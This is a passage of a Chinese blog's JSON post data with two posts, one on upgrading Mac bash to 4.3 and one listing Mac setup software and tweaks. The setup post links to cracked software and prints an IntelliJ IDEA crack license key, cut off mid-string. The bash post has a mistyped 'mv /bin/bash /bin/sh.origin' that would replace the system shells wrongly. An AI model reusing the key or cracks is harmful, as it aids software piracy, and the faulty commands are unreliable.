XSScrapy](http://itindex.net/detail/51089-xss-xsscrapy)\n- [xsscrapy](https://github.com/DanMcInerney/xsscrapy)","slug":"article/security/WEB安全初探之XSS","published":1,"updated":"2016-03-31T13:41:06.000Z","_id":"cilpxkga8001yavbt6bwpn9kg","comments":1,"layout":"post","photos":[],"link":""},{"title":"升级mac bash到4.3版本","date":"2016-01-29T10:52:00.000Z","_content":"\n<img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" />\n\n\n# 升级mac bash到4.3版本\n\n\n## 一、前言\nMAC OS版本：OS X Yosemite 10.10.5\n\n经查看bash版本发现，默认的bash版本为：3.2.57(1)-release\n``` bash\nyerba-buena:~ yeshaoting$ /bin/bash -version\nGNU bash, version 3.2.57(1)-release (x86_64-apple-darwin14)\nCopyright (C) 2007 Free Software Foundation, Inc.\n```\n\n\n## 二、版本升级\n借助mac下的命令行安装工具brew安装bash。\n\n### 方式1：brew安装\n``` bash\nyerba-buena:article yeshaoting$ brew install bash\n==> Installing dependencies for bash: readline\n==> Installing bash dependency: readline\n==> Downloading https://homebrew.bintray.com/bottles/readline-6.3.8.yosemite.bottle.tar.gz\n……\n```\n\n### 方式2：自行编译安装\nbash下载地址：http://ftp.gnu.org/gnu/bash/\n\n```\nwget http://ftp.gnu.org/gnu/bash/bash-4.2.tar.gz\ntar zxvf bash-4.2.tar.gz\ncd bash-4.2\n./configure\nmake\nmake install\n```\n\n\n## 三、版本替换\n\n### 1. 替换bash\n``` bash\nyerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/bash.origin\nyerba-buena:~ yeshaoting$ sudo ln -s /usr/local/opt/bash/bin/bash /bin/bash\n```\n\n由于本mac版本下的sh并不是直接链接bash，而是bash的一个文件拷贝。因此，还要替换默认的sh指向的命令为bash，如下：\n``` bash\nyerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/sh.origin\nyerba-buena:~ yeshaoting$ sudo ln -s /usr/local/opt/bash/bin/bash /bin/sh\n```\n\n### 2. 验证\n通过bash和sh命令查看版本：\n``` bash\nyerba-buena:~ yeshaoting$ bash -version\nGNU bash，版本 4.3.42(1)-release (x86_64-apple-darwin14.5.0)\nCopyright (C) 2013 Free Software Foundation, Inc.\n许可证 GPLv3+: GNU GPL 许可证第三版或者更新版本 <http://gnu.org/licenses/gpl.html>\n\nThis is free software; you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n```\n\n通过BASH_VERSION变更查看版本：\n``` bash\nyerba-buena:~ yeshaoting$ echo $BASH_VERSION\n4.3.42(1)-release\n```\n\n\n## 四、重要特性\n关联数组从bash 4.0开始被引入，关联数组的索引值可以使用任意的文本。\n\n\n## 五、参考文档\n1. [升级Mountain Lion的bash到4.2版本](http://zengrong.net/post/1830.htm)\n2. [[Shell学习笔记] 数组、关联数组和别名使用](http://www.1987.name/164.html)\n3. [shell升级，Linux系统升级bash](http://www.1987.name/166.html)\n4. [MAC系统默认命令行环境BASH版本升级修改](http://levi.yii.so/archives/4862)","source":"_posts/article/mac/升级mac bash到4.3版本.md","raw":"title: 升级mac bash到4.3版本\ntags:\n  - mac\n  - shell\ncategories:\n  - 工具软件\ndate: 2016-01-29 18:52:00\n---\n\n<img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" />\n\n\n# 升级mac bash到4.3版本\n\n\n## 一、前言\nMAC OS版本：OS X Yosemite 10.10.5\n\n经查看bash版本发现，默认的bash版本为：3.2.57(1)-release\n``` bash\nyerba-buena:~ yeshaoting$ /bin/bash -version\nGNU bash, version 3.2.57(1)-release (x86_64-apple-darwin14)\nCopyright (C) 2007 Free Software Foundation, Inc.\n```\n\n\n## 二、版本升级\n借助mac下的命令行安装工具brew安装bash。\n\n### 方式1：brew安装\n``` bash\nyerba-buena:article yeshaoting$ brew install bash\n==> Installing dependencies for bash: readline\n==> Installing bash dependency: readline\n==> Downloading https://homebrew.bintray.com/bottles/readline-6.3.8.yosemite.bottle.tar.gz\n……\n```\n\n### 方式2：自行编译安装\nbash下载地址：http://ftp.gnu.org/gnu/bash/\n\n```\nwget http://ftp.gnu.org/gnu/bash/bash-4.2.tar.gz\ntar zxvf bash-4.2.tar.gz\ncd bash-4.2\n./configure\nmake\nmake install\n```\n\n\n## 三、版本替换\n\n### 1. 替换bash\n``` bash\nyerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/bash.origin\nyerba-buena:~ yeshaoting$ sudo ln -s /usr/local/opt/bash/bin/bash /bin/bash\n```\n\n由于本mac版本下的sh并不是直接链接bash，而是bash的一个文件拷贝。因此，还要替换默认的sh指向的命令为bash，如下：\n``` bash\nyerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/sh.origin\nyerba-buena:~ yeshaoting$ sudo ln -s /usr/local/opt/bash/bin/bash /bin/sh\n```\n\n### 2. 验证\n通过bash和sh命令查看版本：\n``` bash\nyerba-buena:~ yeshaoting$ bash -version\nGNU bash，版本 4.3.42(1)-release (x86_64-apple-darwin14.5.0)\nCopyright (C) 2013 Free Software Foundation, Inc.\n许可证 GPLv3+: GNU GPL 许可证第三版或者更新版本 <http://gnu.org/licenses/gpl.html>\n\nThis is free software; you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n```\n\n通过BASH_VERSION变更查看版本：\n``` bash\nyerba-buena:~ yeshaoting$ echo $BASH_VERSION\n4.3.42(1)-release\n```\n\n\n## 四、重要特性\n关联数组从bash 4.0开始被引入，关联数组的索引值可以使用任意的文本。\n\n\n## 五、参考文档\n1. [升级Mountain Lion的bash到4.2版本](http://zengrong.net/post/1830.htm)\n2. [[Shell学习笔记] 数组、关联数组和别名使用](http://www.1987.name/164.html)\n3. [shell升级，Linux系统升级bash](http://www.1987.name/166.html)\n4. [MAC系统默认命令行环境BASH版本升级修改](http://levi.yii.so/archives/4862)","slug":"article/mac/升级mac bash到4.3版本","published":1,"updated":"2016-03-31T15:22:13.000Z","_id":"cilpxkgad0027avbtqszo3kjb","comments":1,"layout":"post","photos":[],"link":""},{"title":"Mac装机软件","date":"2015-12-29T09:56:00.000Z","_content":"\n<img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" />\n\n\n## 一、应用软件\n\n### 1. 安装腾讯电脑管家\n下载地址：http://mac.guanjia.qq.com/\n\n软件下载列表：\n - 百度云同步盘\n - 百度音乐\n - 微信\n - QQ\n - Evernote\n - firefox\n - chrome\n - thunderbird\n - Foxmail\n - Thunder\n - VirtualBox\n - The Unarchiver\n - 搜狗五笔\n - Sublime Text 2(需自行破解，参见：http://myroot.lofter.com/post/15197d_4e94e1)\n - beyond compare(需自行破解)\n - AirDroid\n - iTerm\n - 欧路词典\n - Snip\n\n<!-- more -->\n\n### 2. haroopad\n下载地址：http://pad.haroopress.com/user.html\n\n### 3. Office\n参见：[office for mac 安装与激活](http://wiki.sankuai.com/pages/viewpage.action?pageId=68729269)\n\n**注**：需要使用outlook邮箱功能还需要安装补丁：Office2011-1447Update_ZH-CN.dmg\n\n### 4. IM大象\nhttp://x.sankuai.com/\n\n### 5. ichm\n[iChm – CHM 阅读器[Mac]](http://www.appinn.com/ichm/)\n\n### 6. Stand for Mac\n参见：[Stand for Mac – 定时提醒你去休息片刻[OS X]](http://www.appinn.com/stand-for-mac/)\n\n### 7. Go2Shell\n一个可以快速在当前目录打开Shell的工具,小巧,非常好用!\n**注**：XtraFinder可以代替。\n\n参见：[Mac必备神器之Go2Shell以及使用技巧](http://www.jianshu.com/p/88c6e68645c4)\n\n### 8. XtraFinder\n10.9之前，Finder 没有多标签功能，第三方免费软件 XtraFinder 是我的必备软件之一，它除了提供类似 chrome 的多标签形式之外，还增加了一系列非常实用的功能：\n1、向上按钮，可以直接返回上一级目录；\n2、拷贝当前路径，有多种形式的路径可以选择，方便在各种环境下直接粘贴；\n3、从当前位置启动：可以直接在当前路径下打开终端；\n4、文件排序目录靠前：与 Windows 下的习惯保持一致，目录排在文件的最前端；\n等等。\n\n参见：[Finder 功能扩展增强](http://www.macgg.com/archives/16303.html)\n\n### 9. 菜单栏日历\nDay-O 是一款能替代 OS X 菜单栏原生日期时间显示的工具，界面风格与原生系统一样，点击还可以看到日历。\n[Day-O – 菜单栏日历[OS X]](http://www.appinn.com/day-o-for-os-x/)\n\n官网：http://shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock\n\n另外一款：LunarCal Mac版\nhttp://www.pc6.com/mach/macdtime/\n\n### 10. Cisco AnyConnect Secure Mobility Client\n\n### 11. vpn&relay\n[自助申请relay/vpn相关事宜](http://wiki.sankuai.com/pages/viewpage.action?pageId=113026078)\n\n#### VPN\n[公司办公网VPN服务使用指南](http://wiki.sankuai.com/pages/viewpage.action?pageId=46338234)\n\n**公司办公网VPN服务使用指南** 中包含有mac与windows连接公司办公网的方法及软件链接。[^]\nmac软件：Tunnelblick\nwindows软件：OpenVPN\n\n#### relay\n[新人权限申请、跳板机使用指南](http://wiki.sankuai.com/pages/viewpage.action?pageId=46341961)\n[Relay双因素认证使用文档](http://wiki.sankuai.com/pages/viewpage.action?pageId=139768289)\n[Relay账号密码修改方法](http://wiki.sankuai.com/pages/viewpage.action?pageId=258722751)\n\n### 12. tuxera ntfs\n自动加载ntfs格式移动设备，并支持读写。\n\n### 13. CheatSheet\n只需长按住 ⌘-command 键就可以显示当前程序的快捷键列表，仅支持 Mac 系统，就这么简单。\n\nCheatSheet 能显示出几乎所有程序的快捷键列表，而列表中的功能，除了可以用快捷键操作，也是可以点的。如果你不喜欢用菜单，用 CheatSheet 来开启功能也是一个不错的办法。\n\n参见：[CheatSheet – 显示当前程序快捷键列表[Mac]](http://www.appinn.com/cheatsheet/)\n\n### 14. HyperDock\nHyperDock是一款可以让你的mac系统的任务栏浏览器图标能像win7系统那样显示当前已打开的网页略缩图，除此之外还可以平均分配画面，往左右一拉可以缺成两个平均画面，网上拉可以变成全屏幕。\n\nHyperDock for Mac 1.5.2 中文破解版百度云盘直接下载：http://pan.baidu.com/s/1pJHv16F\n\n### x. 更多应用软件\n参见：[装机必备](http://www.maczapp.com/zjbb)\n\n\n## 二、开发软件\n\n### 1. git\n图形工具：SourceTree\n\n### 2. jdk\n\n### 3. IDE\neclipse，STS\n\n#### IDEA\n破解码：\n```\nC0FHYYCJ22-eyJsaWNlbnNlSWQiOiJDMEZIWVlDSjIyIiwibGljZW5zZWVOYW1lIjoid2VpIGh1YW5nIiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IiIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJmYWxsYmFja0RhdGUiOiIyMDE2LTAyLTI1IiwicGFpZFVwVG8iOiIyMDE2LTAyLTI1In1dLCJoYXNoIjoiMjE2MDg1MS8wIiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-gpr4wd65mz5ExkwIKDiLKA6dGOPpOBBzZyKWUPaTpjUBIGAXFGFcId5tJPK2KeIUDOSbRKOONGm5tI8DL69MtiD22//QDeln5/UO5NBlyEUU352gX6smobx3aC19vjZHPpAkmhZYVyZEmOEAzhDZ8bO/q5u+anxHLRCmV931wBQm7SjnXAhFLRGOEAhOBnw+KxzZF4KCT5GgySK1V4Be7QCegjyvpOKtgVBpIgylnEiZKTMESXiXNNiKMaI+f9JT9ZjQgNlLvZQzXWl5GGNg/689wZ45OMZtg2HAoATh6f7VMWfbFMqZOu8xrTjEEwlt9KG8apzTdtM7lnSSZ4p5eQ==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog==\n```\n\n参见：\n - [IntelliJ IDEA 14 注册码](http://hw1287789687.iteye.com/blog/2153894)\n - [IntelliJ IDEA 14 在线注册机](http://inhu.net/intellij-idea-14-keygen.html)\n\n### 4. maven\n\n### 5. securecrt\n注册的主机配置路径：cd ~/Library/Application\\ Support/VanDyke/SecureCRT/Config/Sessions/\n\n参见：\n - [Mac下面的SecureCRT(附破解方案) 更新到最新的7.2](http://bbs.feng.com/read-htm-tid-6939481.html)\n - 评论[Mac下面的SecureCRT(附破解方案) 更新到最新的7.3.2](http://blog.csdn.net/skykingf/article/details/17450561)\n\n### 6. redis desktop manager\n\n### 7. mysql\n下载：mysql-5.6.27-osx10.9-x86_64.dmg\n正常安装，默认无密码。\n\n更改mysql root密码：\n``` shell\ncd /usr/local/mysql-5.6.27-osx10.8-x86_64/bin\nsudo ./mysqld_safe\n./mysqladmin -u root password 新密码\n```\n\n参见：\n - [MySQL for Mac 安装和基本操作(包含后期的环境变量设置)](http://2484055.blog.51cto.com/2474055/1335382)\n - [MySQLStartupItem.pkg missing from MySQL DMG](http://stackoverflow.com/questions/26110314/mysqlstartupitem-pkg-missing-from-mysql-dmg)\n\n### 8. mysql workbench\n\n### 9. JD-GUI\njava class反编译工具\n\n\n## 三、系统配置\n\n### 1. 截图快捷键\nCmd+Shift+3：全屏截图；截取整个屏幕，保存截图至桌面文件夹。\nCmd+Shift+4：区域截图；鼠标光标变成带坐标的小十字，通过拖拽截取特定区域，保存截图至桌面文件夹。\nCmd+Shift+4：单击空格键 - 鼠标单击指定窗口：窗口截图；出现小十字光标后对指定窗口按空格键，鼠标光标变成照相机，鼠标单击截取指定窗口，保存截图至桌面文件夹。\n参见：[OS X 系统自带的截图快捷键有哪些？](http://www.zhihu.com/question/19550327/answer/12222576)\n\n### 2. 时间显示设置\n右上角托盘设置。\n![mac时间显示设置](http://7xkl4i.com1.z0.glb.clouddn.com/mac时间显示设置.png)\n\n### 3. 更改功能键行为\n![mac更改功能键行为](http://7xkl4i.com1.z0.glb.clouddn.com/mac更改功能键行为.png)\n\n如果希望将顶部一行按键用作标准功能键（而不执行图标指示的特殊功能），但又不想按 Fn 键，请执行以下操作：\n（1）从 Apple 菜单中，选取系统偏好设置。\n（2）从显示菜单中，选取键盘（在 Mac OS X v10.5.8 或更早版本中，则为键盘与鼠标）。\n（3）点按“键盘”（如果需要的话）。\n（4）启用“将 F1、F2 等键用作标准功能键”。\n启用此选项时，顶部一行按键将用作标准功能键 (F1 - F12)，而不执行音量控制等特殊功能。启用此选项后，若要使用任一上述按键上所印图标指示的功能，请按 Fn。例如，如果启用了上述选项，请按 Fn-F10 来开关静音功能。\n\n参见：[Mac OS X：如何更改功能键的行为](https://support.apple.com/zh-cn/HT3399)\n\n### 4. 申请Apple ID\n到App Store里创建\n\n### 5. 文件剪切\n你只需选中目标文件，然后使用 Command+C 复制，然后用 Command +Option+V 将其移动到目标目录。\n\n[Mac 教程：OS X「剪切」移动文件的三种方法](http://sspai.com/28389)\n\n### 6. 显示隐藏文件(未尝试)\nMac 可以用命令行显示默认隐藏的文件：\n``` shell\ndefaults write com.apple.finder AppleShowAllFiles TRUE\nkillall Finder\n```\n\n参见：[ShowOrHide – 开关隐藏文件的显示[Mac]](http://www.appinn.com/showorhide/)\n\n### 7. 新建位于文件夹位置的终端窗口\nhttp://apple.stackexchange.com/a/42450/40485\n\n系统偏好设置 -> 键盘 -> 快捷键 -> 服务，勾选「新建位于文件夹位置的终端窗口」（后面的键盘快捷键可以不选），然后在 Finder 里面选中文件夹右键菜单的「服务」下面就会有「新建位于文件夹位置的终端窗口」这一子菜单了。\n\n参见：[MAC OSX右键菜单能否添加类似于“在终端中打开当前目录”的快捷方式](https://www.v2ex.com/t/81344)\n\n### 8. 打印机\n参见：[富士施乐打印机添加教程(For MAC)](http://wiki.sankuai.com/pages/viewpage.action?pageId=79933100)\n\n### 9. Mac怎么彻底关闭开机声音(粗略尝试不好用)\n关闭开机声音：`sudo nvram SystemAudioVolume=%80`\n恢复开机声音：`sudo nvram -d SystemAudioVolume`\n\n参见：[使用终端命令 关闭Mac电脑开机启动音](http://www.macx.cn/thread-2071828-1-1.html)\n\n### 10. 如何更改 OS X 截图默认保存路径\n``` shell\ndefaults write com.apple.screencapture location ~/Pictures/screenshots/\nkillall SystemUIServer\n```\n\n参见：\n - [更改OS X默认的截图文件名及格式](http://fduo.org/osx-screenshot-settings/)\n - [如何更改 OS X 截图默认保存路径](http://sspai.com/26327)\n\n### 11. Finder标题栏显示当前文件夹路径\n\n#### 标题栏显示当前文件夹路径\n``` shell\ndefaults write com.apple.finder _FXShowPosixPathInTitle -bool TRUE\nkillall Finder\n```\n\n#### 恢复默认设置\n``` shell\ndefaults delete com.apple.finder _FXShowPosixPathInTitle\nkillall Finder\n```\n\n参见：[[Mac]如何在Finder标题栏显示当前文件夹路径？](http://www.macgg.com/archives/7824.html)\n\n### 12. 邮件配置\n邮件客户端都需要提供邮件服务器信息：\n\n#### 接收邮件服务器\n请选择IMAP协议，并填写服务器地址为：imap.meituan.com ：端口 993 （SSL加密） （加密请不要使用TLS）\n\n#### 发送邮件服务器\n请选择SMTP协议，并填写服务器地址为：smtp.meituan.com : 端口 587 （TLS加密）（注意请开启SMTP发信认证）\n\n参考：[美团邮件系统](http://wiki.sankuai.com/pages/viewpage.action?pageId=22577293)\n\n\n### 13. 配色\n\n#### 文件列表颜色\n修改.bash_profile 或者 .profile，添加如下内容：\n```\nalias ll=\"ls -al\"\nalias grep='grep --color'\nalias egrep='egrep --color'\nalias fgrep='fgrep --color'\nalias tree=\"find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'\"\n\nexport CLICOLOR=1\nexport LSCOLORS=gxfxaxdxcxegedabagacad\n```\n\n#### vim着色\n修改.vimrc，添加如下内容：\n```\nsyntax on\n```\n\n### 14. brew\n\n#### 安装HomeBrew\n``` shell\nruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n```\n\n#### 安装Homebrew Cask\n``` shell\nbrew install caskroom/cask/brew-cask\n```\n\n\n### 15. tree\n``` shell\nbrew install tree\n```\n\n### 16. wget\n``` shell\nbrew install wget\n```\n\n\n### 17. 禁止修改文件扩展名的警告\n**借助终端**\n``` bash\ndefaults write com.apple.finder FXEnableExtensionChangeWarning -bool false\nkillall Finder\n```\n\n**界面设置**\n> 其实只要直接在 Finder 中按＂⌘,＂进入 Preferences，然后选择 “Advanced” – 取消 “Show warning before changing an extension” 前面的勾就可以了。\n\n参见：[OS X 小技巧 – 禁止修改文件扩展名的警告[Mac]](http://www.appinn.com/disablefile-extension-warning/)\n","source":"_posts/article/mac/Mac装机软件.md","raw":"title: Mac装机软件\ntags:\n  - 小记\n  - mac\n  - 装机\ncategories:\n  - 工具软件\ndate: 2015-12-29 17:56:00\n---\n\n<img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" />\n\n\n## 一、应用软件\n\n### 1. 安装腾讯电脑管家\n下载地址：http://mac.guanjia.qq.com/\n\n软件下载列表：\n - 百度云同步盘\n - 百度音乐\n - 微信\n - QQ\n - Evernote\n - firefox\n - chrome\n - thunderbird\n - Foxmail\n - Thunder\n - VirtualBox\n - The Unarchiver\n - 搜狗五笔\n - Sublime Text 2(需自行破解，参见：http://myroot.lofter.com/post/15197d_4e94e1)\n - beyond compare(需自行破解)\n - AirDroid\n - iTerm\n - 欧路词典\n - Snip\n\n<!-- more -->\n\n### 2. haroopad\n下载地址：http://pad.haroopress.com/user.html\n\n### 3. Office\n参见：[office for mac 安装与激活](http://wiki.sankuai.com/pages/viewpage.action?pageId=68729269)\n\n**注**：需要使用outlook邮箱功能还需要安装补丁：Office2011-1447Update_ZH-CN.dmg\n\n### 4. IM大象\nhttp://x.sankuai.com/\n\n### 5. ichm\n[iChm – CHM 阅读器[Mac]](http://www.appinn.com/ichm/)\n\n### 6. Stand for Mac\n参见：[Stand for Mac – 定时提醒你去休息片刻[OS X]](http://www.appinn.com/stand-for-mac/)\n\n### 7. Go2Shell\n一个可以快速在当前目录打开Shell的工具,小巧,非常好用!\n**注**：XtraFinder可以代替。\n\n参见：[Mac必备神器之Go2Shell以及使用技巧](http://www.jianshu.com/p/88c6e68645c4)\n\n### 8. XtraFinder\n10.9之前，Finder 没有多标签功能，第三方免费软件 XtraFinder 是我的必备软件之一，它除了提供类似 chrome 的多标签形式之外，还增加了一系列非常实用的功能：\n1、向上按钮，可以直接返回上一级目录；\n2、拷贝当前路径，有多种形式的路径可以选择，方便在各种环境下直接粘贴；\n3、从当前位置启动：可以直接在当前路径下打开终端；\n4、文件排序目录靠前：与 Windows 下的习惯保持一致，目录排在文件的最前端；\n等等。\n\n参见：[Finder 功能扩展增强](http://www.macgg.com/archives/16303.html)\n\n### 9. 菜单栏日历\nDay-O 是一款能替代 OS X 菜单栏原生日期时间显示的工具，界面风格与原生系统一样，点击还可以看到日历。\n[Day-O – 菜单栏日历[OS X]](http://www.appinn.com/day-o-for-os-x/)\n\n官网：http://shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock\n\n另外一款：LunarCal Mac版\nhttp://www.pc6.com/mach/macdtime/\n\n### 10. Cisco AnyConnect Secure Mobility Client\n\n### 11. vpn&relay\n[自助申请relay/vpn相关事宜](http://wiki.sankuai.com/pages/viewpage.action?pageId=113026078)\n\n#### VPN\n[公司办公网VPN服务使用指南](http://wiki.sankuai.com/pages/viewpage.action?pageId=46338234)\n\n**公司办公网VPN服务使用指南** 中包含有mac与windows连接公司办公网的方法及软件链接。[^]\nmac软件：Tunnelblick\nwindows软件：OpenVPN\n\n#### relay\n[新人权限申请、跳板机使用指南](http://wiki.sankuai.com/pages/viewpage.action?pageId=46341961)\n[Relay双因素认证使用文档](http://wiki.sankuai.com/pages/viewpage.action?pageId=139768289)\n[Relay账号密码修改方法](http://wiki.sankuai.com/pages/viewpage.action?pageId=258722751)\n\n### 12. tuxera ntfs\n自动加载ntfs格式移动设备，并支持读写。\n\n### 13. CheatSheet\n只需长按住 ⌘-command 键就可以显示当前程序的快捷键列表，仅支持 Mac 系统，就这么简单。\n\nCheatSheet 能显示出几乎所有程序的快捷键列表，而列表中的功能，除了可以用快捷键操作，也是可以点的。如果你不喜欢用菜单，用 CheatSheet 来开启功能也是一个不错的办法。\n\n参见：[CheatSheet – 显示当前程序快捷键列表[Mac]](http://www.appinn.com/cheatsheet/)\n\n### 14. HyperDock\nHyperDock是一款可以让你的mac系统的任务栏浏览器图标能像win7系统那样显示当前已打开的网页略缩图，除此之外还可以平均分配画面，往左右一拉可以缺成两个平均画面，网上拉可以变成全屏幕。\n\nHyperDock for Mac 1.5.2 中文破解版百度云盘直接下载：http://pan.baidu.com/s/1pJHv16F\n\n### x. 更多应用软件\n参见：[装机必备](http://www.maczapp.com/zjbb)\n\n\n## 二、开发软件\n\n### 1. git\n图形工具：SourceTree\n\n### 2. jdk\n\n### 3. IDE\neclipse，STS\n\n#### IDEA\n破解码：\n```\nC0FHYYCJ22-eyJsaWNlbnNlSWQiOiJDMEZIWVlDSjIyIiwibGljZW5zZWVOYW1lIjoid2VpIGh1YW5nIiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IiIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJmYWxsYmFja0RhdGUiOiIyMDE2LTAyLTI1IiwicGFpZFVwVG8iOiIyMDE2LTAyLTI1In1dLCJoYXNoIjoiMjE2MDg1MS8wIiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-gpr4wd65mz5ExkwIKDiLKA6dGOPpOBBzZyKWUPaTpjUBIGAXFGFcId5tJPK2KeIUDOSbRKOONGm5tI8DL69MtiD22//QDeln5/UO5NBlyEUU352gX6smobx3aC19vjZHPpAkmhZYVyZEmOEAzhDZ8bO/q5u+anxHLRCmV931wBQm7SjnXAhFLRGOEAhOBnw+KxzZF4KCT5GgySK1V4Be7QCegjyvpOKtgVBpIgylnEiZKTMESXiXNNiKMaI+f9JT9ZjQgNlLvZQzXWl5GGNg/689wZ45OMZtg2HAoATh6f7VMWfbFMqZOu8xrTjEEwlt9KG8apzTdtM7lnSSZ4p5eQ==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzu